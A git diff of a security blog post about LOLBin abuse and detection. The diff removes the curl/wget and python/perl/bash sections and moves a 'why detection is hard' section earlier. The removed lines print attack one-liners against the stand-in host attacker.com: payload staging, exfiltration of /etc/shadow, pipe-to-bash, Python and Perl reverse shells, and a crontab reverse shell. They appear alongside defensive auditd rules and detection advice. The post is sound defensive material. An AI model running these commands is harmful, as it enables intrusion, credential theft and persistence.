@@ -6,12 +6,26 @@ categories:
   - Security Research
     
 tags: [threat-research, lolbins, lolbas, defense-evasion, red-team, blue-team]
-description: "A per-tool breakdown of how LOLBins work, how they're abused, how to test for exposure, and what defenders can actually do about it."
+description: "A breakdown of how LOLBins work, how they're abused, how to test for exposure, and what defenders can actually do about it."
 ---
 
 Detection engineering has a needle-in-a-haystack problem. LOLBin abuse makes it a needle-in-a-stack-of-needles problem. The malicious invocation looks nearly identical to the legitimate one. The binary is signed by Microsoft. The process is expected to exist. The network traffic is indistinguishable from normal operations at first glance. There is no payload to hash, no dropper to sandbox, no import table to scan. Just the OS doing what it was built to do, pointed somewhere it shouldn't go.
 
-This post is a technical case study covering six LOLBin primitives across Windows and Linux. For each one: how it works legitimately, how it gets abused, how to test whether your environment is exposed, and what defenders can build or configure to detect or prevent misuse. This is reference material. Hoard it.
+This post is a technical case study covering three LOLBin primitives across Windows and Linux. For each one: how it works legitimately, how it gets abused, how to test whether your environment is exposed, and what defenders can build or configure to detect or prevent misuse. This is reference material. Hoard it.
+
+---
+
+
+## Why Detection Is Hard 
+
+The detection challenge is not identifying that `certutil.exe` ran. It is determining whether the specific invocation of `certutil.exe` was legitimate or malicious. This requires behavioral context that signature-based detection does not provide.
+
+What process spawned it? What was the parent? What was the network destination? Is this consistent with the host's baseline behavior? Does this machine normally run this binary at all?
+
+Behavioral detection closes the gap, but it generates noise, requires tuning, and is only as good as the baseline you establish. An attacker who does reconnaissance before executing knows what normal looks like on the target. They time their activity to blend. The better-resourced the operator, the more deliberate the blending.
+
+This is not a reason to give up on behavioral detection. It is a reason to build it carefully, instrument it deeply, and understand the attack surface before you write the first rule.
+
 
 ---
 
@@ -259,152 +273,6 @@ detection:
 **Detection: rundll32 with no command-line arguments.** Legitimate rundll32 invocations always include a DLL and a function name. Rundll32 executing with an empty or malformed argument string is a strong indicator of process hollowing or in-memory injection.
 
 **Block rundll32 from making outbound connections** at the host firewall level. Legitimate use cases for rundll32 reaching the internet are essentially nonexistent in managed environments.
-
----
-
-## curl / wget (Linux)
-
-### How It Works
-
-`curl` and `wget` are standard HTTP/HTTPS/FTP transfer utilities available on virtually every Linux system. They handle file retrieval, form submission, and protocol interaction from the command line. Present by default on most distributions, and installed as a dependency by countless packages even when not explicitly requested.
-
-### How It Gets Abused
-
-On a compromised Linux host, curl and wget are the default tools for pulling down second-stage payloads, exfiltrating data, and issuing C2 callbacks because they are always present and their traffic pattern is indistinguishable from application-generated HTTP.
-
-**Payload staging:**
-```bash
-curl -o /tmp/.hidden http://attacker.com/stage2.elf && chmod +x /tmp/.hidden && /tmp/.hidden
-```
-
-**Data exfiltration:**
-```bash
-curl -X POST -d @/etc/shadow http://attacker.com/collect
-```
-
-**Reverse shell via curl to controlled endpoint (less common but observed):**
-```bash
-curl http://attacker.com/shell.sh | bash
-```
-
-The pipe-to-bash pattern is worth calling out specifically because it never writes the script to disk. The payload exists only in memory during execution.
-
-**MITRE ATT&CK mapping:** [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
-
-### Testing Exposure
-
-On a representative Linux host, run:
-
-```bash
-curl -o /tmp/loltest http://example.com/ && ls -la /tmp/loltest
-```
-
-Check whether your SIEM or EDR captures the process execution with full arguments. On Linux, this requires either auditd with syscall rules or an EDR agent with process telemetry. If you are relying solely on syslog, you likely have no visibility here.
-
-Check whether egress filtering is in place:
-
-```bash
-curl -v http://169.254.169.254/latest/meta-data/  # AWS IMDS test
-```
-
-If that returns metadata on a cloud instance, your instance has no IMDS v2 enforcement or egress filtering, which is a broader problem than LOLBins.
-
-### The Defense
-
-**Auditd rules for curl and wget.** The Linux Audit Daemon captures syscall-level events. The following rule logs all execve calls involving curl or wget:
-
-```
--a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -k curl_exec
--a always,exit -F arch=b64 -S execve -F exe=/usr/bin/wget -k wget_exec
-```
-
-Pipe this into your SIEM and build alerting on invocations that include IPs outside your expected egress ranges, flag file writes to world-writable directories (`/tmp`, `/dev/shm`, `/var/tmp`), or combine with a `chmod +x` within the same session.
-
-**Egress filtering.** Workloads that do not need arbitrary outbound HTTP should not have it. Linux servers in controlled environments should reach a defined set of destinations. A firewall policy that defaults-deny outbound and permits only expected destinations makes curl-based payload staging significantly harder regardless of what the binary is.
-
-**Alert on pipe-to-shell patterns.** This requires process execution logging with arguments. A detection rule watching for `bash` or `sh` with a parent process of `curl` is low-volume and high-fidelity in most environments.
-
-**On cloud infrastructure,** restrict IMDS access to IMDSv2-only and use VPC flow logs to detect unexpected outbound connections from compute instances.
-
----
-
-## python3 / perl / bash
-
-### How It Works
-
-Script interpreters ship with virtually every Linux distribution. Python3 is installed as a system dependency on most modern systems. Perl remains common on older infrastructure. Bash is the default shell everywhere. All three can execute arbitrary code, make network connections, write files, and spawn child processes without any additional tooling.
-
-### How It Gets Abused
-
-Interpreters are Swiss Army knives for post-exploitation. The most common uses are shell stabilization, reverse shells, and persistence scripting.
-
-**Python reverse shell:**
-```python
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
-```
-
-**Shell stabilization (TTY upgrade):**
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-This is present in essentially every CTF writeup and real-world post-exploitation guide for a reason: it works, it uses a tool that is already on the box, and it is very hard to distinguish from a legitimate developer or admin TTY upgrade.
-
-**Perl reverse shell:**
-```perl
-perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
-```
-
-**Bash persistence via crontab:**
-```bash
-(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -
-```
-
-**MITRE ATT&CK mapping:** [T1059.006 - Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/), [T1059.004 - Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
-
-### Testing Exposure
-
-Verify your process telemetry captures interpreter arguments:
-
-```bash
-python3 -c 'import socket; print(socket.gethostname())'
-```
-
-Check your SIEM for this event. If you see `python3` as the process but no command-line arguments, you have an auditd configuration gap.
-
-Test whether outbound socket connections from interpreter processes are logged:
-
-```bash
-python3 -c 'import urllib.request; urllib.request.urlopen("http://example.com")'
-```
-
-Correlate against network flow logs. If a Python process makes an outbound connection that is not associated with a known application, that is worth flagging.
-
-### The Defense
-
-**Process execution logging with full arguments is non-negotiable here.** Without command-line arguments, you see `python3` ran. With them, you see it spawned a socket and exec'd a shell. The difference in detection value is absolute. Auditd `execve` rules for `/usr/bin/python3`, `/usr/bin/perl`, and `/bin/bash` are the baseline.
-
-**Anomaly-based detection on interpreter network activity.** In most production environments, Python processes that make outbound TCP connections do so from a small set of known application processes (web app servers, scheduled jobs, monitoring agents). A Python process making an outbound connection on port 4444, or to a public IP not in your egress allow list, is a high-fidelity signal.
-
-**SIEM correlation rule: interpreter spawning interactive shell:**
-
-Look for processes where `python3`, `perl`, or `bash -i` is the parent and the child is `/bin/bash` or `/bin/sh`. The `pty.spawn` pattern is particularly distinctive: `python3 -c` with `pty` in the argument string, spawning bash as a child process.
-
-**Restrict interpreter access on production servers where scripting is not required.** This is easier said than done, but servers running compiled applications have no operational need for an interactive Python session. AppArmor or SELinux profiles can restrict which processes interpreters can spawn.
-
-**Monitor crontab modifications.** Changes to crontab files should be logged and alerted on, particularly when the modification occurs outside a change window or is made by an account that does not normally schedule jobs.
-
----
-
-## Why Detection Is Hard (and Why That Is the Point)
-
-The detection challenge is not identifying that `certutil.exe` ran. It is determining whether the specific invocation of `certutil.exe` was legitimate or malicious. This requires behavioral context that signature-based detection does not provide.
-
-What process spawned it? What was the parent? What was the network destination? Is this consistent with the host's baseline behavior? Does this machine normally run this binary at all?
-
-Behavioral detection closes the gap, but it generates noise, requires tuning, and is only as good as the baseline you establish. An attacker who does reconnaissance before executing knows what normal looks like on the target. They time their activity to blend. The better-resourced the operator, the more deliberate the blending.
-
-This is not a reason to give up on behavioral detection. It is a reason to build it carefully, instrument it deeply, and understand the attack surface before you write the first rule.
 
 ---
 
